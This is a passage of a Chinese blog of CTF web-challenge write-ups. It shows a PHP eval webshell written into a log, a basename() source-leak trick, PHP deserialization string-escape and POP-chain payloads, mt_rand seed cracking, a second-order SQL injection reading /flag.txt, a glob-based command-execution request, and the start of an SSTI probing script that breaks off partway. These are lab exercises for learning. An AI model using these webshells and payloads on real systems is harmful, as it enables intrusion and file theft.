+<h3 id="PHP短标签"><a href="#PHP短标签" class="headerlink" title="PHP短标签"></a>PHP短标签</h3><p>登陆后发现需要上传文件，随便上传个马上去，得到文件名不能包含php字符串。</p>
+<p>这里发现文件名会被写入到日志里，于是直接写个马进去。</p>
+<p><code>&lt;?=eval($_POST[&#39;a&#39;]);?&gt;</code>，然后用蚁剑成功登入拿到flag。</p>
+<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>点击source之后可以查看到index.php的源码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里匹配了一串随机字符串给guess进行比较，很明显是不能走这里拿flag的。</p>
+<p>那么回头看</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中==$_SERVER[‘PHP_SELF’]==，会读取当前PHP文件相对于网站根目录的位置地址。</p>
+<p>这里发现了一个<code>basename()</code>函数，这个函数会返回路径中的文件名部分，但是这个函数有一个问题，它会去掉文件名开头的非ASCII值。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">basename(<span class="string">&quot;config.php/%ff&quot;</span>); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>
+<p>然后再加个source参数就可以读取源码了。</p>
+<p>最终payload</p>
+<blockquote>
+<p>/index.php/config.php/%ff?source</p>
+</blockquote>
+<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>使用dirsearch进行目录检索可以查到有一个==<a href="http://www.zip==,直接下载下来可以看到源码./">www.zip==，直接下载下来可以看到源码。</a></p>
+<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>在<code>profile.php</code>里可以看到<code>file_get_contents</code>函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure>
+<p>然后在<code>config.php</code>里发现了flag。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>所以我们可以通过<code>file_get_contents</code>函数读取<code>config.php</code>以拿到flag。</p>
+<p>但是这里需要使<code>$profile[&#39;photo&#39;]</code>可控，于是在<code>update.php</code>里发现这一段。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><p>这里可以通过提交<code>nickname</code>进行反序列化字符逃逸，把原来的<code>photo</code>顶掉换成我们想要的。</p>
+<p>原来构造得到的序列化字符是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们把我们需要的<code>config.php</code>加进去</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>但是这里还有一个点就是前面有一个if限制了nickname的长度。</p>
+<p>于是我们可以选择数组进行绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后由于我们是在<code>nickname</code>里输入的，所以需要将<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这34个字符逃逸出来。</p>
+<p>这里因为最后进<code>update_profile()</code>函数里后会有一个正则，正则会替换一些字符串为<code>hacker</code>，这里可以取巧一下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为我们需要逃逸共34个字符，而替换的hacker为6个字符，所以我们可以选择where进行替换，这样每替换一个字符串长度都会+1</span><br><span class="line">where&#x3D;5 &#x3D;&gt; 34*5&#x3D;170</span><br><span class="line">hacker&#x3D;6 &#x3D;&gt; 34*6&#x3D;204 &#x3D;&gt; 204-170&#x3D;34</span><br></pre></td></tr></table></figure>
+<p>这样子就可以逃逸出34个字符了</p>
+<p>然后注册登陆update就可以拿到flag了</p>
+<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h3><p>在network里可以跟到check.php，得到源码。</p>
+<p>核心就是这一段</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>这里很明显是要拿到seed然后逆向拿到原字符串才能得到flag。</p>
+<h3 id="seed爆破"><a href="#seed爆破" class="headerlink" title="seed爆破"></a>seed爆破</h3><p>这里可以用php_mt_seed进行爆破，<a href="https://xz.aliyun.com/t/3656#toc-3">原理看这</a>。</p>
+<p>但是爆破前需要转成工具所需的格式，这里放脚本，具体也是看原理。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;hch2FuienH&#x27;</span> // 已经给出的字符串放这</span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<p>然后将得到的数据拿到<code>php_mt_seed</code>里爆破即可得到<code>seed</code>。</p>
+<p>![](C:\Users\violet\Desktop\my blog\blog\source_posts\WriteUp\BUUOJ web 1pts\nS6mYpkeVGcbyhu.png)</p>
+<p>这里得出的seed=904536600，放回去爆出原字符串。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">904536600</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>然后提交即可得到flag。</p>
+<blockquote>
+<p>flag{bb7792f8-ba2d-4fe0-84c5-22aa8ea48825}</p>
+</blockquote>
+<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><h3 id="php伪协议读取文件"><a href="#php伪协议读取文件" class="headerlink" title="php伪协议读取文件"></a>php伪协议读取文件</h3><p>打开网页源代码可以发现一个file参数，使用php伪协议进行文件截流即可读取文件。</p>
+<blockquote>
+<p>url_here?file=php://filter/convert.base64-encode/resource=confirm.php</p>
+</blockquote>
+<p>总共有confirm.php, change.php, search.php, index.php, delete.php这几个文件。</p>
+<h3 id="sql二次报错注入"><a href="#sql二次报错注入" class="headerlink" title="sql二次报错注入"></a>sql二次报错注入</h3><p>挺多参数给过滤过了，但是唯独address没有被过滤，可以从这里入手。</p>
+<p>先直接提交address</p>
+<blockquote>
+<p>1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),1,30)),0x7e),1)#</p>
+</blockquote>
+<p>这时address已经被录入进数据库中了，然后我们从change.php里再次调用address就会触发sql注入。</p>
+<p>得到一半的flag</p>
+<blockquote>
+<p>errorXPATH syntax error: ‘<del>flag{ae44900b-3688-41e7-ab00-2</del>‘</p>
+</blockquote>
+<p>然后再次注入就可以拿到完整的flag了</p>
+<blockquote>
+<p>flag{ae44900b-3688-41e7-ab00-20da18e3d421}</p>
+</blockquote>
+<h2 id="津门杯2021-power-cut"><a href="#津门杯2021-power-cut" class="headerlink" title="[津门杯2021]power_cut"></a>[津门杯2021]power_cut</h2><h3 id="swp源码泄露"><a href="#swp源码泄露" class="headerlink" title="swp源码泄露"></a>swp源码泄露</h3><p><code>.index.php.swp</code>下载index.php源码，得到的源码是混乱的，需要重新自己整理一下o(´^｀)o。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialise variables</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fd</span> = fopen(<span class="keyword">$this</span>-&gt;logFile, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fd</span>, <span class="variable">$msg</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log_unser</span> = unserialize(<span class="variable">$log</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>看源码可以知道是一道简单的反序列化题。</p>
+<p>首先是<code>__wakeup()</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里进到了logger类里，logger类里有一个<code>__construct</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">    readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有一个readfile，到这应该就可以拿到flag了，大概顺序就是</p>
+<blockquote>
+<p>weblog -&gt; __wakeup() -&gt; logger -&gt; __construct() -&gt; readfile</p>
+</blockquote>
+<p>poc在这里</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialise variables</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="keyword">new</span> weblog();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$log</span>);</span><br></pre></td></tr></table></figure>
+<p>这里穿的时候要注意一下，刚开始有个正则需要双写绕。</p>
+<h2 id="津门杯2021-hate-php"><a href="#津门杯2021-hate-php" class="headerlink" title="[津门杯2021]hate_php"></a>[津门杯2021]hate_php</h2><p>这题是一道无字母数字的trick，可以用p神的方法绕，<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">原理在这</a>。</p>
+<p>虽然@被ban了，但是还可以用?</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /?code=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.%<span class="number">20</span>/???/????????[?-[]`;<span class="meta">?&gt;</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">122.112</span><span class="number">.214</span><span class="number">.101</span>:<span class="number">20002</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">90.0</span><span class="number">.4430</span><span class="number">.93</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span></span><br><span class="line"><span class="comment">Content-Length: 172</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.sh&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">cat /flag</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span></span><br></pre></td></tr></table></figure>
+<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>简单的ssti题，但是需要写代码查找所需类的位置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">170</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&quot;http://9cf6a01e-8851-4fbe-a9d1-586bcb300271.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        res = re.findall(<span class="string">&quot;&lt;h2&gt;You searched 